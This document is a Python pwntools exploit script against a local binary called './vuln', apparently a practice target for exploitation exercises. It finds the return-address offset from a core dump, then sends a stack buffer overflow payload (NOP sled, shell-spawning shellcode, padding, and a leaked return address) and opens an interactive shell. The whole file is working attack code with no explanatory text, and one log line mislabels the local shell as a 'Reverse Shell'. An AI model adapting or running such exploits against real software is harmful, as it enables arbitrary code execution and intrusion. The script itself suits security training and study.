from pwn import *

def get_rip_offset():
    p = process('./vuln')
    pattern = cyclic(500)

    p.recvuntil(b'What is your name?')
    p.sendline(pattern)

    p.wait()

    try:
        core = p.corefile
        stack = core.rsp

        target_pattern = core.read(stack, 4)
        rip_offset = cyclic_find(target_pattern)

        log.success(f"RIP offset: {rip_offset}")    
        return rip_offset
    except Exception as e:
        print(f"[-] Error: {e}")
        return -1

def inject_shell():
    offset = get_rip_offset();
    if offset == -1:
        print("[-] RIP offset could not be located!")
        return

    try:
        info("Generating Reverse Shell-Code. . .")
        # generate shellcode snippet
        context.update(arch='amd64', os='linux')
        
        shellcode = asm(shellcraft.sh())

        info(f"Shell-Code Length: {len(shellcode)}")

        nop_sled = b'\x90' * 10
        
        buffer_size = int(input("Size of Buffer > "))

        padding = b'A' * max(0, buffer_size - len(nop_sled + shellcode)) # fill the buffer
        padding2 = b'B' * max(0, offset - buffer_size) # fill space between the buffer and RIP

        info(f"BUFFER_PAYLOAD_LENGTH: {len(nop_sled + shellcode + padding)}")
        info(f"PADDING_LENGTH: {len(padding2)}")
        
        info("Generating Victim Process. . .")
        # send the payload to the program
        p = process('./vuln')
        
        p.recvuntil(b'buffer: ')
        payload_address = p.readline().strip().decode()
        info(f"Payload Address: {payload_address}")

        ret = p64(int(payload_address, 16)) # <-- address to jump to (shellcode)
        info(f"RET_LENGTH: {len(ret)}")

        # FORMAT [ nop sled + shell + pad + ret ]
        payload = nop_sled + shellcode + padding + padding2 + ret

        info(f"Payload Len: {len(payload)}")

        p.recvuntil(b'What is your name?')
        p.sendline(payload)
        p.interactive()
    except Exception as e:
        error(f"Error: {e}")

def clean_up():
    info("Cleaning CWD. . .")
    os.system('rm -f core.*')

def main():
    inject_shell()
    clean_up()

if __name__ == '__main__':
    main()
